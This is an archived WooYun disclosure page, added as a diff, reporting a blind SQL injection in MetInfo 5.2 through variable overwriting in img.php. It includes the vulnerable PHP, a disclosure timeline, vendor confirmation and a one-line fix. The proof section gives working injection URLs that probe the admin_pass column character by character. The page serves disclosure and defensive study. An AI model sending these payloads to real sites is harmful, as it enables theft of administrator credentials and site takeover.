@@ -1,0 +1,225 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		MetInfo最新版SQL盲注漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		MetInfo最新版SQL盲注漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/進撃のDanny">進撃のDanny</a> 
+</li><li>提交时间：		2014-01-07 19:36</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-07：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-15：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-01：	细节向普通白帽子公开<br/>
+									2014-02-21：	细节向实习白帽子公开<br/>
+									2014-04-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">MetInfo最新版SQL盲注漏洞，可盲注管理员信息。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">D:\www\php\MetInfo5.2\img\img.php <br />
+<br />
+</p><pre><code>&lt;?php<br />
+# MetInfo Enterprise Content Management System <br />
+# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. <br />
+require_once &#039;../include/common.inc.php&#039;;<br />
+$mdname = &#039;img&#039;;<br />
+$showname = &#039;showimg&#039;;<br />
+$dbname = $met_img;<br />
+$dbname_list = $met_img_list;<br />
+$mdmendy = 1;<br />
+$imgproduct = &#039;img&#039;;<br />
+require_once &#039;../include/global/listmod.php&#039;;<br />
+$img_listnow = $modlistnow;<br />
+$img_list_new  = $md_list_new;<br />
+$img_class_new = $md_class_new;<br />
+$img_list_com  = $md_list_com;<br />
+$img_class_com = $md_class_com;<br />
+$img_class     = $md_class;<br />
+$img_list      = $md_list;<br />
+require_once &#039;../public/php/imghtml.inc.php&#039;;<br />
+include template(&#039;img&#039;);<br />
+footer();<br />
+# This program is an open source system, commercial use, please consciously to purchase commercial license.<br />
+# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+第7行$dbname可以覆盖此变量<br />
+<br />
+http://localhost/case/?settings[met_img]=met_admin_table%20or%201=1 -- <br />
+<br />
+</p><p class="detail"><a href="../images/0718475684f56cfda202e7a7c82eea578574175d.png" target="_blank"><img src="../images/0718475684f56cfda202e7a7c82eea578574175d.png" alt="QQ截图20140107184719.png" width="600"/></a></p><p class="detail"><br />
+<br />
+来到文件<br />
+<br />
+D:\www\php\MetInfo5.2\include\global\listmod.php<br />
+<br />
+</p><pre><code>require_once substr(dirname(__FILE__), 0, -6).&#039;common.inc.php&#039;;<br />
+require_once &#039;../include/global/pseudo.php&#039;;<br />
+if($dbname!=$met_download&amp;&amp;$dbname!=$met_img&amp;&amp;$dbname!=$met_news&amp;&amp;$dbname!=$met_product){okinfo(&#039;../404.html&#039;);exit();}<br />
+if($class_list[$class1][&#039;module&#039;]&gt;=100||($class1==0&amp;&amp;$class2==0&amp;&amp;$class3==0)){<br />
+	if($search==&quot;search&quot;){<br />
+		$search_module=$imgproduct==&#039;product&#039;?3:5;<br />
+		$query=&quot;select * from $met_column where module=&#039;$search_module&#039; and (classtype=1 or releclass!=0) and lang=&#039;$lang&#039; order by no_order ASC,id ASC&quot;;<br />
+		$search_coloumn=$db-&gt;get_all($query);<br />
+		$class1=$search_coloumn[0][&#039;id&#039;];<br />
+	}else{</code></pre><p class='detail'><br />
+<br />
+接着进入数据库查询即可导致注入。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">打开页面<br />
+<br />
+http://localhost/case/?settings[met_img]=met_admin_table where substr(left((admin_pass),32),1,1)=char(56)-- 1<br />
+<br />
+-----返回空白<br />
+<br />
+http://localhost/case/?settings[met_img]=met_admin_table where substr(left((admin_pass),32),1,1)=char(55)-- 1<br />
+<br />
+-----返回案例<br />
+<br />
+通过返回的信息可以盲注出管理员信息。<br />
+<br />
+</p><p class="detail"><a href="../images/07185405a517baab2ab06bb9cd65b58470298fe3.jpg" target="_blank"><img src="../images/07185405a517baab2ab06bb9cd65b58470298fe3.jpg" alt="t01995df10741cf85f4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复变量覆盖 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/進撃のDanny" title="進撃のDanny">進撃のDanny</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048203" title="MetInfo最新版SQL盲注漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-12 11:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD通过本地实例复现，暂未在互联网上有实例复现，由CNVD联系软件生产厂商，向其通报漏洞情况。如后续有互联网实例，也可以进一步提交。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48203";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
